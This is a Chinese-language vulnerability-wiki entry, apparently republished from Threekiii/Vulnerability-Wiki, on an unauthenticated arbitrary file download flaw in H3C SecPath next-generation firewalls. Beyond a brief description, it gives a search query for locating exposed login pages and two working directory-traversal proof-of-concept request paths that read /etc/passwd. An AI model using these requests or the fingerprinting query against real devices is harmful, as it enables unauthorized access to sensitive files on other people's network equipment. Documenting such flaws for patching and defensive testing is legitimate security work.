---
title: "H3C SecPath下一代防火墙 任意文件下载漏洞"
date: 2026-10-18 09:14:34
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "H3C"
tags:
  - "H3C"
  - "任意文件下载"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

H3C SecPath 下一代防火墙  存在功能点导致任意文件下载漏洞，攻击者通过漏洞可以获取敏感信息

## 漏洞影响

```
H3C SecPath
```

## 网络测绘

```
title="Web user login"
```

## 漏洞复现

登录页面如下

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202110914717.png)

存在漏洞点的功能有两个

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202110914728.png)

点击下载抓包更改请求

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202110914422.png)

并且在未身份验证的情况中，也可以请求下载敏感文件

验证POC

```plain
/webui/?g=sys_dia_data_check&file_name=../../etc/passwd

/webui/?
g=sys_capture_file_download&name=../../../../../../../../etc/passwd
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/H3C-SecPath%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md)
